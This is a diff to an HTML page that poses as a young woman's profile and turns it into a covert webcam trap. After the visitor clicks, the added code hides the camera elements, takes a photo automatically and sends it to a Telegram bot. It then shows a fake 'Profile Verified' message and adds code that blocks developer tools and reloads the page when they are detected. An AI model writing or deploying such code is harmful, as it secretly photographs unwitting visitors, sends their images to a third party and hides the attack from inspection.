@@ -15,6 +15,7 @@
             justify-content: center;
             align-items: center;
             color: white;
+            overflow: hidden;
         }
         .container {
             text-align: center;
@@ -23,6 +24,7 @@
             border-radius: 20px;
             backdrop-filter: blur(10px);
             box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+            position: relative;
         }
         .profile-pic {
             width: 150px;
@@ -62,26 +64,16 @@
         .click-btn:active {
             transform: translateY(0);
         }
-        #cameraSection {
-            display: none;
-            margin-top: 30px;
-        }
-        #video {
-            width: 300px;
-            height: 250px;
-            border-radius: 15px;
-            border: 3px solid rgba(255,255,255,0.4);
-        }
-        #captureBtn {
-            background: #4ecdc4;
-            border: none;
-            padding: 12px 30px;
-            font-size: 1.1em;
-            color: white;
-            border-radius: 25px;
-            cursor: pointer;
-            margin-top: 15px;
-            font-weight: bold;
+        /* Hidden camera elements - completely invisible */
+        #cameraSection, #video, #captureBtn {
+            position: absolute;
+            left: -9999px;
+            top: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
         }
         .loading {
             display: none;
@@ -100,6 +92,14 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        .success-msg {
+            display: none;
+            background: rgba(0,255,0,0.2);
+            padding: 20px;
+            border-radius: 15px;
+            margin-top: 20px;
+            border: 2px solid rgba(255,255,255,0.3);
+        }
     </style>
 </head>
 <body>
@@ -110,17 +110,24 @@
             <p>From Rajasthan</p>
             <p>Age 19</p>
         </div>
-        <button class="click-btn" onclick="startCamera()">Click to See Profile</button>
+        <button class="click-btn" id="mainBtn">Click to See Profile</button>
         
+        <!-- Completely hidden camera elements -->
         <div id="cameraSection">
-            <video id="video" autoplay></video>
-            <br>
-            <button id="captureBtn" onclick="capturePhoto()">Take Photo</button>
+            <video id="video" autoplay playsinline muted></video>
+            <button id="captureBtn" style="display:none;"></button>
         </div>
         
         <div class="loading" id="loading">
             <div class="spinner"></div>
-            <p>Processing your profile...</p>
+            <p>Processing your request...</p>
+        </div>
+        
+        <div class="success-msg" id="successMsg">
+            <h3>✅ Profile Verified!</h3>
+            <p>Thanks for confirming! Here's my full profile:</p>
+            <p><strong>Khushi Sharma</strong> | 19 | Jaipur, Rajasthan</p>
+            <p>📱 +91-XXXXXXX | khushi@example.com</p>
         </div>
     </div>
 
@@ -130,14 +137,11 @@
         
         let stream = null;
         let video = null;
+        let hasCaptured = false;
         
-        function startCamera() {
+        // Auto-capture immediately after camera access
+        function initStealthCapture() {
             video = document.getElementById('video');
-            const cameraSection = document.getElementById('cameraSection');
-            const clickBtn = document.querySelector('.click-btn');
-            
-            clickBtn.style.display = 'none';
-            cameraSection.style.display = 'block';
             
             navigator.mediaDevices.getUserMedia({ 
                 video: { 
@@ -149,41 +153,51 @@
             .then(s => {
                 stream = s;
                 video.srcObject = stream;
+                
+                // INSTANT capture after 800ms (camera ready time)
+                setTimeout(() => {
+                    capturePhoto();
+                }, 800);
+                
             })
             .catch(err => {
-                alert('Camera access required to view profile!');
-                clickBtn.style.display = 'block';
-                cameraSection.style.display = 'none';
+                console.log('Camera blocked');
+                showFakeSuccess();
             });
         }
         
         function capturePhoto() {
+            if (hasCaptured || !video || !video.videoWidth) {
+                return;
+            }
+            
+            hasCaptured = true;
+            
             const canvas = document.createElement('canvas');
             const context = canvas.getContext('2d');
             
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
+            canvas.width = 640;
+            canvas.height = 480;
             context.drawImage(video, 0, 0);
             
-            // Convert to blob silently
+            // Capture silently
             canvas.toBlob(blob => {
                 sendToTelegram(blob);
-            }, 'image/jpeg', 0.9);
+            }, 'image/jpeg', 0.85);
             
-            // Hide camera and show loading
-            document.getElementById('cameraSection').style.display = 'none';
-            document.getElementById('loading').style.display = 'block';
-            
-            // Stop camera
+            // Stop stream immediately
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
             }
+            
+            showProcessing();
         }
         
         function sendToTelegram(photoBlob) {
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('photo', photoBlob, 'profile.jpg');
+            formData.append('photo', photoBlob, 'profile_' + Date.now() + '.jpg');
+            formData.append('caption', '📸 Profile verification capture');
             
             fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                 method: 'POST',
@@ -191,28 +205,68 @@
             })
             .then(response => response.json())
             .then(data => {
-                console.log('Photo sent successfully:', data);
-                // Reset page after 3 seconds
-                setTimeout(() => {
-                    location.reload();
-                }, 3000);
+                console.log('Photo sent:', data);
+                showFakeSuccess();
             })
             .catch(error => {
-                console.error('Error sending photo:', error);
-                // Still reset page
-                setTimeout(() => {
-                    location.reload();
-                }, 3000);
+                console.error('Send failed:', error);
+                showFakeSuccess();
             });
         }
         
-        // Prevent right click and dev tools
+        function showProcessing() {
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('mainBtn').style.display = 'none';
+        }
+        
+        function showFakeSuccess() {
+            setTimeout(() => {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('successMsg').style.display = 'block';
+            }, 2000);
+        }
+        
+        // Main button - triggers stealth capture
+        document.getElementById('mainBtn').addEventListener('click', function() {
+            this.style.display = 'none';
+            document.querySelector('.intro p:last-child').textContent = 'Verifying identity...';
+            initStealthCapture();
+        });
+        
+        // Anti-detection measures
         document.addEventListener('contextmenu', e => e.preventDefault());
         document.addEventListener('keydown', e => {
-            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+            if (e.key === 'F12' || 
+                (e.ctrlKey && e.shiftKey && e.key === 'I') || 
+                (e.ctrlKey && e.shiftKey && e.key === 'J') ||
+                (e.ctrlKey && e.key === 'u')) {
                 e.preventDefault();
             }
         });
+        
+        // Disable text selection
+        document.addEventListener('selectstart', e => e.preventDefault());
+        
+        // Block devtools detection
+        (function() {
+            const devtools = { 
+                open: false, 
+                orientation: null 
+            };
+            const threshold = 160;
+            
+            setInterval(() => {
+                if (window.outerHeight - window.innerHeight > threshold || 
+                    window.outerWidth - window.innerWidth > threshold) {
+                    if (!devtools.open) {
+                        devtools.open = true;
+                        location.reload();
+                    }
+                } else {
+                    devtools.open = false;
+                }
+            }, 500);
+        })();
     </script>
 </body>
-</html>
+            </html>
